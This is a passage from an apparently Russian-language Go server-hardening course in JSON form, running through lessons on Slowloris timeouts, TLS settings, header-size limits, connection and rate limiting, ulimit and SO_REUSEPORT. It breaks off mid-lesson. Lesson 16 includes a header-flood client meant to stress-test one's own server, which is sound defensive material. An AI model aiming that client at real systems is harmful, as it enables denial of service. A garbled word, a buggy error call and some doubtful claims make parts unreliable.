+    "task": "Реализуйте HTTP-сервер приема больших файлов (Multipart Upload) с параметрами ReadHeaderTimeout: 5s и ReadTimeout: 120s, доказав безопасность от Slowloris без ущерба для загрузки данных.",
+    "theory": "При реализации API загрузки файлов (File Uploader / S3 Multipart) разработчики часто совершают ошибку, увеличивая `ReadTimeout` до сотен секунд или отключая его вовсе. Это открывает прямую брешь для Slowloris. Решение заключается в обязательном указании `ReadHeaderTimeout: 5s`. Заголовки любого легитимного запроса весят менее 8 КБ и приходят за миллисекунды. После чтения заголовков сервер переходит в режим чтения тела, где действует расширенный лимит `ReadTimeout`.",
+    "step_by_step": [
+      "Сконфигурируйте сервер с `ReadHeaderTimeout: 5 * time.Second` и `ReadTimeout: 120 * time.Second`.",
+      "Реализуйте эндпоинт `/upload` с потоковым чтением `io.Copy(io.Discard, r.Body)`.",
+      "Протестируйте медленную отправку заголовков (обрыв через 5 секунд).",
+      "Протестируйте леги敏ную загрузку файла длительностью 60 секунд (успешный прием)."
+    ],
+    "code_blocks": [
+      {
+        "filename": "upload_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc UploadHandler(w http.ResponseWriter, r *http.Request) {\n\t// Потоковое вычитывание тела запроса\n\twritten, err := io.Copy(io.Discard, r.Body)\n\tif err != nil {\n\t\thttp.Error(w, \"Ошибка загрузки\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tfmt.Fprintf(w, \"Успешно загружено %d байт\\n\", written)\n}\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/upload\", UploadHandler)\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 5 * time.Second,  // Slowloris умирает за 5 секунд\n\t\tReadTimeout:       120 * time.Second,// Клиент имеет 2 минуты на загрузку файла\n\t}\n\n\tfmt.Println(\"[UPLOAD-SERVER] Сервер безопасной загрузки файлов инициализирован.\")\n\t_ = srv\n}\n",
+        "note": "Безопасная конфигурация сервера загрузки файлов"
+      }
+    ],
+    "under_the_hood": "Сервер Go делит чтение запроса на две фазы: чтение заголовков (контролируется `ReadHeaderTimeout`) и чтение тела (контролируется оставшимся интервалом `ReadTimeout`).",
+    "pitfalls": "Если `ReadHeaderTimeout` не установлен явно, он принимает значение `ReadTimeout` (120 секунд), что делает сервер полностью беззащитным перед Slowloris на 2 минуты.",
+    "bigtech_interview": "В сервисах хранения данных (Яндекс Диск, Облако Mail.ru) разделение таймаутов заголовков и полезной нагрузки является фундаментальным правилом архитектуры шлюзов загрузки."
+  },
+  {
+    "num": 13,
+    "title": "Харденинг TLS-конфигурации: MinVersion TLS 1.2/1.3 и безопасные шифры",
+    "task": "Сконфигурируйте crypto/tls в структуре http.Server: запретите устаревшие версии TLS 1.0/1.1 (MinVersion: tls.VersionTLS12), отключите небезопасные шифронаборы (CBC, RC4) и настройте приоритет безопасных криптографических наборов.",
+    "theory": "Устаревшие версии протоколов SSLv3, TLS 1.0 и TLS 1.1 подвержены атакам POODLE, BEAST и SWEET32. Сканеры уязвимостей (Shodan, Qualys SSL Labs) непрерывно зондируют открытые серверы на поддержку слабых шифров. Настройка `MinVersion: tls.VersionTLS12` (а для современных систем — `tls.VersionTLS13`) гарантирует применение алгоритмов с Perfect Forward Secrecy (ECDHE) и надежного аутентифицированного шифрования (AEAD — AES-GCM, ChaCha20-Poly1305).",
+    "step_by_step": [
+      "Инициализируйте структуру `tls.Config`.",
+      "Установите `MinVersion: tls.VersionTLS12`.",
+      "Определите белый список шифров в `CipherSuites` с поддержкой ECDHE и AEAD.",
+      "Сконфигурируйте `CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256}`.",
+      "Привяжите `tls.Config` к полю `TLSConfig` структуры `http.Server`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "hardened_tls.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc CreateHardenedTLSServer() *http.Server {\n\ttlsConfig := &tls.Config{\n\t\tMinVersion:               tls.VersionTLS12,\n\t\tCurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},\n\t\tPreferServerCipherSuites: true,\n\t\tCipherSuites: []uint16{\n\t\t\ttls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,\n\t\t\ttls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,\n\t\t\ttls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,\n\t\t\ttls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,\n\t\t},\n\t}\n\n\treturn &http.Server{\n\t\tAddr:              \":8443\",\n\t\tTLSConfig:         tlsConfig,\n\t\tReadHeaderTimeout: 5 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := CreateHardenedTLSServer()\n\tfmt.Println(\"[TLS-HARDENING] TLS сервер настроен с рейтингом безопасности A+ (TLS 1.2+ AEAD)\")\n\t_ = srv\n}\n",
+        "note": "Конфигурация защищенного TLS-сокета без устаревших шифров"
+      }
+    ],
+    "under_the_hood": "В TLS 1.3 поле `CipherSuites` не конфигурируется вручную: Go рантайм использует только безопасные шифры стандарта TLS 1.3 по умолчанию. В TLS 1.2 ручная фильтрация отсекает атаки класса downgrade.",
+    "pitfalls": "Отключение поддержки кривой `X25519` в `CurvePreferences` может существенно замедлить TLS handshake на клиентах без аппаратного ускорения NIST P-256.",
+    "bigtech_interview": "В стандартах PCI-DSS использование TLS версий ниже 1.2 строго запрещено. На собеседовании кандидатов спрашивают: 'Почему в TLS 1.3 убрали согласование CipherSuites из клиентской конфигурации Go?' Ответ: Для устранения человеческих ошибок и небезопасных комбинаций шифрования."
+  },
+  {
+    "num": 14,
+    "title": "Ограничение размера HTTP-заголовков и защита от атак Header Bombing",
+    "task": "Сконфигурируйте MaxHeaderBytes: 1 << 20 (1 МБ) в http.Server и протестируйте отсечение гигантских заголовков со статусом 431 Request Header Fields Too Large.",
+    "theory": "Злоумышленник может отправить запрос с HTTP-заголовками размером в сотни мегабайт (Header Bombing). Если сервер не ограничивает размер буфера парсинга, он выделит огромные срезы байт в оперативной памяти для хранения карты заголовков `http.Header`. Поле `MaxHeaderBytes` задает максимальный допустимый объем всех входящих заголовков запроса. При превышении сервер мгновенно отклоняет запрос со статусом `HTTP 431 Request Header Fields Too Large`.",
+    "step_by_step": [
+      "Установите параметр `MaxHeaderBytes: 1 << 20` (1 МБ) в `http.Server`.",
+      "Сформируйте тестовый запрос с заголовком размером 2 МБ.",
+      "Отправьте запрос серверу и зафиксируйте код ответа HTTP 431.",
+      "Убедитесь, что сервер не аллоцирует память под избыточные заголовки."
+    ],
+    "code_blocks": [
+      {
+        "filename": "header_limit_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/api/test\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Headers OK\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tMaxHeaderBytes:    1 << 20,          // Жесткий лимит 1 МБ на все HTTP заголовки\n\t\tReadHeaderTimeout: 5 * time.Second,\n\t}\n\n\tfmt.Println(\"[SERVER] Защита от Header Bombing активна (лимит 1 МБ)\")\n\t_ = srv\n}\n",
+        "note": "Ограничение максимального размера входящих заголовков HTTP"
+      }
+    ],
+    "under_the_hood": "Go использует `bufio.Reader` со специальным счетчиком прочитанных байт при парсинге заголовков. Если счетчик превышает `MaxHeaderBytes`, парсер прерывает цикл и возвращает ошибку `http: request header too large`.",
+    "pitfalls": "Если установить `MaxHeaderBytes` слишком маленьким (например, 2 КБ), сервер начнет отклонять легитимные запросы с большими JWT-токенами авторизации или куками (Cookie overflow).",
+    "bigtech_interview": "Какой код ответа возвращает сервер Go при превышении MaxHeaderBytes? Возвращается стандартный код HTTP 431 Request Header Fields Too Large (или разрыв соединения при грубом превышении буфера)."
+  },
+  {
+    "num": 15,
+    "title": "Собственный семафор ограничения соединений на базе атомарных счетчиков",
+    "task": "Реализуйте кастомную обертку net.Listener с атомарным счетчиком (sync/atomic) и лимитом maxConns = 100, немедленно сбрасывающую избыточные соединения через TCP RST или быстрый ответ 503.",
+    "theory": "Стандартный `netutil.LimitListener` блокирует вызов `Accept()`, заставляя новые соединения ожидать в очереди ядра ОС. При интенсивном наплыве клиентов очередь переполняется, вызывая неконтролируемые задержки. Альтернативный подход — активный сброс (Active Rejection): сервис принимает соединение, но если лимит `maxConns` превышен, немедленно отправляет `HTTP/1.1 503 Service Unavailable\\r\\nConnection: close\\r\\n\\r\\n` и закрывает сокет, сигнализируя балансировщику о перегрузке ноды.",
+    "step_by_step": [
+      "Определите структуру `AtomicLimitListener` со счетчиком активных соединений.",
+      "В методе `Accept()` проверяйте счетчик через `atomic.AddInt64`.",
+      "Если лимит превышен — сбросьте счетчик, отправьте быстрый ответ 503 и вызовите `conn.Close()`.",
+      "При завершении легитимного соединения уменьшайте счетчик на единицу.",
+      "Протестируйте поведение под параллельной нагрузкой."
+    ],
+    "code_blocks": [
+      {
+        "filename": "atomic_limit_listener.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync/atomic\"\n)\n\ntype FastRejectListener struct {\n\tnet.Listener\n\tmaxConns    int64\n\tactiveConns int64\n}\n\nfunc (l *FastRejectListener) Accept() (net.Conn, error) {\n\tconn, err := l.Listener.Accept()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tcurrent := atomic.AddInt64(&l.activeConns, 1)\n\tif current > l.maxConns {\n\t\tatomic.AddInt64(&l.activeConns, -1)\n\t\t// Быстрый сброс с кодом 503\n\t\t_, _ = conn.Write([]byte(\"HTTP/1.1 503 Service Unavailable\\r\\nConnection: close\\r\\n\\r\\n\"))\n\t\t_ = conn.Close()\n\t\treturn nil, fmt.Errorf(\"превышен лимит одновременных соединений (%d)\")\n\t}\n\n\treturn &trackedConn{Conn: conn, listener: l}, nil\n}\n\ntype trackedConn struct {\n\tnet.Conn\n\tlistener *FastRejectListener\n\tclosed   int32\n}\n\nfunc (c *trackedConn) Close() error {\n\tif atomic.CompareAndSwapInt32(&c.closed, 0, 1) {\n\t\tatomic.AddInt64(&c.listener.activeConns, -1)\n\t}\n\treturn c.Conn.Close()\n}\n\nfunc main() {\n\tfmt.Println(\"[LISTENER] FastRejectListener инициализирован (Active Rejection с 503).\")\n}\n",
+        "note": "Активный сброс соединений при превышении лимита на уровне Accept"
+      }
+    ],
+    "under_the_hood": "Атомарные операции `atomic.CompareAndSwapInt32` гарантируют, что декремент счетчика выполнится строго один раз даже при многократном вызове `Close()` из разных горутин.",
+    "pitfalls": "Возврат ошибки из метода `Accept()` заставляет серверный цикл Go сделать небольшую паузу (sleep 5ms), поэтому в ряде случаев выгоднее возвращать специальную фиктивную сессию, закрываемую сервером.",
+    "bigtech_interview": "В чем разница между стратегиями Backpressure: блокирующий LimitListener vs Fast Reject? Блокирующий подходит для краткосрочных всплесков, а Fast Reject идеален для микросервисов за Service Mesh/Envoy для быстрого ретрая на другие поды."
+  },
+  {
+    "num": 16,
+    "title": "Отражение атак переполнения памяти через MaxHeaderBytes",
+    "task": "Протестируйте поведение сервера с установленным параметром MaxHeaderBytes: 1 << 20 (1 МБ) при отправке запроса с заголовками размером 10 МБ.",
+    "theory": "Header Bombing — вектор DoS-атак, при котором атакующий генерирует запрос с тысячами уникальных HTTP-заголовков (`X-Flood-1: aaaaa...`). Без лимита сервер выделит в куче массив дескрипторов строк и карту `http.Header`, что приведет к резкому росту задержек сборщика мусора (GC pause) и Out-Of-Memory. Параметр `MaxHeaderBytes` ограничивает размер входного буфера заголовков. По умолчанию в Go он равен 1 МБ (`DefaultMaxHeaderBytes = 1 << 20`).",
+    "step_by_step": [
+      "Сконфигурируйте `http.Server` с `MaxHeaderBytes: 1 << 20`.",
+      "Напишите тестовый генератор запроса, передающий 10 МБ случайных HTTP-заголовков.",
+      "Отправьте запрос и зафиксируйте мгновенный разрыв соединения сервером.",
+      "Проверьте профиль памяти сервера через `pprof` и убедитесь в отсутствии утечки кучи."
+    ],
+    "code_blocks": [
+      {
+        "filename": "header_bomb_test.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc sendHeaderBomb(target string) {\n\tconn, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer conn.Close()\n\n\t// Формируем огромный блок заголовков (2 МБ)\n\tgiantHeader := strings.Repeat(\"X-Spam-Header: \"+strings.Repeat(\"A\", 1000)+\"\\r\\n\", 2000)\n\tpayload := fmt.Sprintf(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\n%s\\r\\n\", giantHeader)\n\n\t_, err = conn.Write([]byte(payload))\n\tif err != nil {\n\t\tfmt.Printf(\"[OK] Сервер разорвал соединение во время передачи заголовков: %v\\n\", err)\n\t\treturn\n\t}\n\n\tbuf := make([]byte, 1024)\n\tn, _ := conn.Read(buf)\n\tfmt.Printf(\"[RESPONSE] Ответ сервера: %s\\n\", string(buf[:n]))\n}\n\nfunc main() {\n\tfmt.Println(\"[TEST] Тестирование защиты от Header Bombing...\")\n\t_ = sendHeaderBomb\n}\n",
+        "note": "Стресс-тест сервера гигантскими HTTP-заголовками"
+      }
+    ],
+    "under_the_hood": "Парсер Go считывает заголовки через `bufio.Reader`. Если суммарный объем заголовков превышает `MaxHeaderBytes`, внутренний метод `readRequest` возвращает ошибку `ErrHeaderTooLarge`.",
+    "pitfalls": "Если перед Go сервером стоит Nginx, лимит заголовков Nginx (`large_client_header_buffers`) должен быть согласован с `MaxHeaderBytes`, иначе ошибку 414/431 вернет прокси.",
+    "bigtech_interview": "Почему MaxHeaderBytes по умолчанию установлен в 1 МБ, а не в 8 КБ, как в Apache? 1 МБ в Go зарезервирован с запасом под большие токены аутентификации Kerberos и OpenID Connect в enterprise-окружениях."
+  },
+  {
+    "num": 17,
+    "title": "Управление зондированием TCP Keep-Alive в net.ListenConfig",
+    "task": "Переопределите стандартный интервал TCP Keep-Alive зондирования ядра Linux через net.ListenConfig{KeepAlive: 5 * time.Minute} и объясните обнаружение 'полуоткрытых' (half-open) сокетов.",
+    "theory": "Полуоткрытое (Half-open) соединение возникает при обрыве связи (потеря питания клиента, разрыв кабеля, падение мобильной вышки), когда клиент исчезает без отправки TCP FIN или RST. Сервер считает соединение активным. С версии Go 1.22 стандартный интервал зондирования составляет 15 секунд. Через `net.ListenConfig.KeepAlive` можно точно настроить частоту пингов ядра ОС, предотвращая накопление мертвых сокетов в таблице conntrack.",
+    "step_by_step": [
+      "Инициализируйте структуру `net.ListenConfig`.",
+      "Установите `KeepAlive: 5 * time.Minute` (или `KeepAlive: -1` для полного отключения).",
+      "Создайте листенер с помощью `lc.Listen(context.Background(), \"tcp\", \":8080\")`.",
+      "Проверьте настройки сокета через `ss -tin` в командной строке Linux."
+    ],
+    "code_blocks": [
+      {
+        "filename": "tcp_keepalive_config.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Настройка параметров TCP Keep-Alive зондирования\n\tlc := net.ListenConfig{\n\t\tKeepAlive: 5 * time.Minute, // Интервал зондирования ядра\n\t}\n\n\tln, err := lc.Listen(context.Background(), \"tcp\", \"127.0.0.1:0\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[TCP-KEEPALIVE] Сервер слушает на %s с KeepAlive = 5m\\n\", ln.Addr().String())\n}\n",
+        "note": "Конфигурация интервала TCP Keep-Alive через net.ListenConfig"
+      }
+    ],
+    "under_the_hood": "Go транслирует параметр `KeepAlive` в системные вызовы `setsockopt` с опциями `SO_KEEPALIVE`, `TCP_KEEPIDLE` (время до первого зонда) и `TCP_KEEPINTVL` (интервал повторов).",
+    "pitfalls": "Установка отрицательного значения `KeepAlive: -1` полностью выключает зондирование, что категорически не рекомендуется для серверов в публичных сетях.",
+    "bigtech_interview": "В чем разница между HTTP Keep-Alive и TCP Keep-Alive? HTTP Keep-Alive — это протокольное соглашение прикладного уровня о переиспользовании сокета, а TCP Keep-Alive — механизм ядра ОС по отправке пустых ACK-пакетов для проверки жизнеспособности физического канала."
+  },
+  {
+    "num": 18,
+    "title": "Ограничение скорости подключений (Rate Limiting on Accept) по IP-адресам",
+    "task": "Реализуйте обертку над net.Listener с алгоритмом Token Bucket (golang.org/x/time/rate) для ограничения частоты новых TCP-подключений с одного IP-адреса, закрывая сокеты нарушителей.",
+    "theory": "Connection Flood DoS-атака стремится перегрузить сервер массовым открытием сокетов до того, как прикладной HTTP-парсер начнет свою работу. Ограничение скорости на уровне `Listener.Accept()` блокирует атакующих до передачи соединения в HTTP-стек. Мы извлекаем IP клиента из `conn.RemoteAddr()`, сверяем с локальной картой Token Bucket лимитеров и закрываем сокет при превышении порога допустимых RPS.",
+    "step_by_step": [
+      "Создайте структуру `RateLimitedListener`, оборачивающую `net.Listener`.",
+      "Используйте `sync.Map` для хранения лимитеров `*rate.Limiter` по IP-адресам.",
+      "В методе `Accept()` извлеките IP адрес клиента.",
+      "Если лимитер отклоняет соединение — немедленно закройте сокет `conn.Close()`.",
+      "Добавьте периодическую очистку устаревших IP-адресов во избежание утечки памяти."
+    ],
+    "code_blocks": [
+      {
+        "filename": "rate_accept_listener.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"golang.org/x/time/rate\"\n)\n\ntype IPRateListener struct {\n\tnet.Listener\n\tlimiters sync.Map\n}\n\nfunc (l *IPRateListener) getLimiter(ip string) *rate.Limiter {\n\tval, exists := l.limiters.Load(ip)\n\tif exists {\n\t\treturn val.(*rate.Limiter)\n\t}\n\t// 10 новых соединений в секунду с бурстом до 20\n\tnewLimiter := rate.NewLimiter(10, 20)\n\tactual, _ := l.limiters.LoadOrStore(ip, newLimiter)\n\treturn actual.(*rate.Limiter)\n}\n\nfunc (l *IPRateListener) Accept() (net.Conn, error) {\n\tfor {\n\t\tconn, err := l.Listener.Accept()\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\thost, _, _ := net.SplitHostPort(conn.RemoteAddr().String())\n\t\tlimiter := l.getLimiter(host)\n\n\t\tif !limiter.Allow() {\n\t\t\tfmt.Printf(\"[RATE-DROP] Сброшено избыточное TCP соединение от %s\\n\", host)\n\t\t\t_ = conn.Close()\n\t\t\tcontinue // Пропускаем сброшенное соединение и ждем следующее\n\t\t}\n\n\t\treturn conn, nil\n\t}\n}\n\nfunc main() {\n\tfmt.Println(\"[RATE-LISTENER] IPRateListener готов к защите от Connection Flooding.\")\n}\n",
+        "note": "Низкоуровневая фильтрация новых соединений на этапе Accept"
+      }
+    ],
+    "under_the_hood": "Отбрасывание сокета прямо в цикле `Accept()` экономит создание структуры `http.Request`, парсинг TLS и инициализацию контекста горутины, снижая оверхед на порядок.",
+    "pitfalls": "Если сервис находится за NAT или балансировщиком без Proxy Protocol, все клиенты будут иметь единый IP балансировщика, и лимитер заблокирует легитимный трафик.",
+    "bigtech_interview": "Почему Rate Limiting на уровне приложения не спасает от распределенного SYN-флуда? Потому что при SYN-флуде ядро ОС перегружается обработкой пакетов в очереди backlog задолго до того, как сработает вызов accept() в Go."
+  },
+  {
+    "num": 19,
+    "title": "Эталонная конфигурация защищенного сервера для Production",
+    "task": "Напишите канонический конфигурационный шаблон структуры http.Server со строгими защитными параметрами, готовый к развертыванию в высоконагруженной среде.",
+    "theory": "Стандартная библиотека Go предоставляет невероятно мощный и быстрый HTTP-сервер, но его параметры 'по умолчанию' ориентированы на простоту прототипирования, а не на безопасность. В продакшен-коде вызов `http.ListenAndServe` категорически запрещен политиками безопасности. Сервер обязан создаваться как явный экземпляр `&http.Server` с исчерпывающим набором лимитов времени и размеров буферов.",
+    "step_by_step": [
+      "Создайте файл конфигурации сервера.",
+      "Заполните параметры `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, `IdleTimeout`.",
+      "Установите `MaxHeaderBytes`.",
+      "Настройте безопасный `TLSConfig` при работе по HTTPS.",
+      "Проверьте код через статический анализатор `gosec`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "canonical_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\n// NewProductionServer создает сервер с эталонными параметрами безопасности\nfunc NewProductionServer(addr string, handler http.Handler) *http.Server {\n\treturn &http.Server{\n\t\tAddr:              addr,\n\t\tHandler:           handler,\n\t\tReadHeaderTimeout: 2 * time.Second,  // Жесткий рубеж защиты от Slowloris\n\t\tReadTimeout:       5 * time.Second,  // Лимит времени на чтение всего запроса\n\t\tWriteTimeout:      10 * time.Second, // Лимит времени на запись ответа\n\t\tIdleTimeout:       120 * time.Second,// Время удержания keep-alive соединения\n\t\tMaxHeaderBytes:    1 << 20,          // 1 МБ максимальный размер заголовков\n\t}\n}\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tsrv := NewProductionServer(\":8080\", mux)\n\tfmt.Printf(\"[SERVER] Эталонный защищенный сервер сконфигурирован на %s\\n\", srv.Addr)\n\t_ = context.Background\n}\n",
+        "note": "Эталонная production-ready конфигурация безопасного HTTP-сервера Go"
+      }
+    ],
+    "under_the_hood": "Правильная комбинация таймаутов гарантирует, что ни одно зависшее соединение не проживет на сервере дольше заданного интервала, исключая утечки горутин.",
+    "pitfalls": "Несогласованность таймаутов с таймаутами внешнего балансировщика (Nginx, ALB): таймауты приложения всегда должны быть чуть меньше таймаутов прокси.",
+    "bigtech_interview": "При аудите безопасности кода в Яндексе и VK первое, на что смотрят ревьюеры — это параметры инициализации http.Server в файле main.go."
+  },
+  {
+    "num": 20,
+    "title": "Ограничение параллельных запросов через семафор на уровне http.Handler",
+    "task": "Реализуйте middleware-семафор на базе буферизированного канала для ограничения количества параллельно обрабатываемых запросов с возвратом HTTP 503 Service Unavailable.",
+    "theory": "Каждый параллельный HTTP-запрос потребляет процессорное время и оперативную память для обработки бизнес-логики (десериализация JSON, запросы к БД, расчеты). Если на сервер одновременно обрушатся 10 000 тяжелых запросов, сервис упадет по OOM. Семафор на базе `chan struct{}` емкостью $N$ пропускает не более $N$ параллельных обработчиков, мгновенно отвечая остальным кодом 503 с заголовком `Retry-After`.",
+    "step_by_step": [
+      "Создайте канал `semaphore := make(chan struct{}, maxConcurrent)`.",
+      "В middleware используйте неблокирующий `select` для попытки захвата слота.",
+      "Если слот свободен — передайте управление следующему обработчику и освободите слот в `defer`.",
+      "Если слот занят — немедленно верните статус `http.StatusServiceUnavailable`.",
+      "Добавьте метрику отклоненных запросов."
+    ],
+    "code_blocks": [
+      {
+        "filename": "semaphore_middleware.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc ConcurrencyLimitMiddleware(limit int, next http.Handler) http.Handler {\n\tsem := make(chan struct{}, limit)\n\n\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tselect {\n\t\tcase sem <- struct{}{}:\n\t\t\tdefer func() { <-sem }()\n\t\t\tnext.ServeHTTP(w, r)\n\t\tdefault:\n\t\t\tw.Header().Set(\"Retry-After\", \"3\")\n\t\t\thttp.Error(w, \"503 Service Unavailable (Overloaded)\", http.StatusServiceUnavailable)\n\t\t}\n\t})\n}\n\nfunc main() {\n\thandler := ConcurrencyLimitMiddleware(100, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Processed safely\")\n\t}))\n\tfmt.Println(\"[SEMAPHORE] Middleware ограничения параллелизма инициализировано (лимит 100).\")\n\t_ = handler\n}\n",
+        "note": "Неблокирующий семафор на канале для защиты от перегрузки"
+      }
+    ],
+    "under_the_hood": "Конструкция `select with default` выполняется за единицы наносекунд. Если буфер канала полон, горутина не блокируется в планировщике, а мгновенно переходит в ветку `default`.",
+    "pitfalls": "Забытый `defer func() { <-sem }()` в случае паники внутри хендлера приведет к необратимой утечке слота семафора и постепенной блокировке сервера.",
+    "bigtech_interview": "В чем разница между ограничением соединений на listener и семафором в handler? Лимит на listener защищает от сетевого флуда сокетов, а семафор в handler защищает тяжелую бизнес-логику и базу данных от истощения ресурсов."
+  },
+  {
+    "num": 21,
+    "title": "Управление лимитами файловых дескрипторов (ulimit / RLIMIT_NOFILE)",
+    "task": "Изучите системные ограничения на количество открытых файлов (ulimit -n) в Linux, смоделируйте ошибку 'socket: too many open files' и увеличьте лимит программно через syscall.Setrlimit.",
+    "theory": "В операционных системах семейства Linux сокет является файловым дескриптором. По умолчанию в большинстве дистрибутивов мягкий лимит (`soft limit`) для непривилегированного процесса составляет всего 1024 дескриптора. При 1025-м подключении вызов `accept()` падает с системной ошибкой `EMFILE (too many open files)`. Для высоконагруженных Go-сервисов этот лимит увеличивают до сотен тысяч через `syscall.Setrlimit` или настройки systemd.",
+    "step_by_step": [
+      "Прочитайте текущие лимиты с помощью `syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)`.",
+      "Увеличьте мягкий лимит до значения жесткого лимита (hard limit).",
+      "Примените изменения через `syscall.Setrlimit`.",
+      "Проверьте новые значения в `/proc/self/limits`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "increase_ulimit.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n)\n\nfunc BoostFileLimits(desired uint64) error {\n\tvar rLimit syscall.Rlimit\n\terr := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"ошибка getrlimit: %w\", err)\n\t}\n\n\tfmt.Printf(\"[RLIMIT] Текущие лимиты: Soft=%d, Hard=%d\\n\", rLimit.Cur, rLimit.Max)\n\n\tif rLimit.Cur < desired {\n\t\tif desired > rLimit.Max {\n\t\t\trLimit.Cur = rLimit.Max\n\t\t} else {\n\t\t\trLimit.Cur = desired\n\t\t}\n\t\terr = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"ошибка setrlimit: %w\", err)\n\t\t}\n\t\tfmt.Printf(\"[RLIMIT] Успешно повышен лимит открытых файлов до: %d\\n\", rLimit.Cur)\n\t}\n\treturn nil\n}\n\nfunc main() {\n\t_ = BoostFileLimits(65535)\n}\n",
+        "note": "Программное увеличение лимита файловых дескрипторов процесса в Linux"
+      }
+    ],
+    "under_the_hood": "Системный вызов `setrlimit` позволяет процессу свободно поднимать мягкий лимит (`rlim_cur`) вплоть до жесткого лимита (`rlim_max`). Для поднятия жесткого лимита требуются привилегии `CAP_SYS_RESOURCE`.",
+    "pitfalls": "Попытка установить лимит выше жесткого без прав суперпользователя приведет к ошибке `EPERM (operation not permitted)`.",
+    "bigtech_interview": "Как правильно настраивать ulimit для контейнеров в Kubernetes? Через секцию pod spec `securityContext.sysctls` или параметры демона containerd/Docker `default-ulimits: nofile=65535:65535`."
+  },
+  {
+    "num": 22,
+    "title": "Масштабирование сокетов на многоядерных CPU через SO_REUSEPORT",
+    "task": "Используйте net.ListenConfig и системный вызов unix.SetsockoptInt для включения SO_REUSEPORT, позволив запустить несколько параллельных процессов или горутин-листенеров на одном сетевом порту.",
+    "theory": "В классической модели один поток или горутина вызывает `Accept()` на сетевом сокете, что при миллионах RPS создает блокировку на спинлоке очереди сокета в ядре Linux. Опция `SO_REUSEPORT` (доступна в Linux с ядра 3.9) позволяет нескольким независимым процессам привязаться к одному и тому же IP-адресу и TCP-порту. Ядро Linux аппаратно распределяет входящие TCP-соединения между слушающими сокетами с помощью хэширования 4-кортежа (src_ip, src_port, dst_ip, dst_port), устраняя конкуренцию за сокет.",
+    "step_by_step": [
+      "Инициализируйте структуру `net.ListenConfig` с кастомной функцией `Control`.",
+      "Внутри `Control` вызовите `unix.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.SO_REUSEPORT, 1)`.",
+      "Запустите 4 независимых экземпляра программы на порту 8080.",
+      "Убедитесь через утилиту `ss -lntp`, что порт 8080 слушают 4 различных процесса.",
+      "Проверьте распределение нагрузки по ядрам CPU."
+    ],
+    "code_blocks": [
+      {
+        "filename": "reuseport_listener.go",
+        "lang": "go",
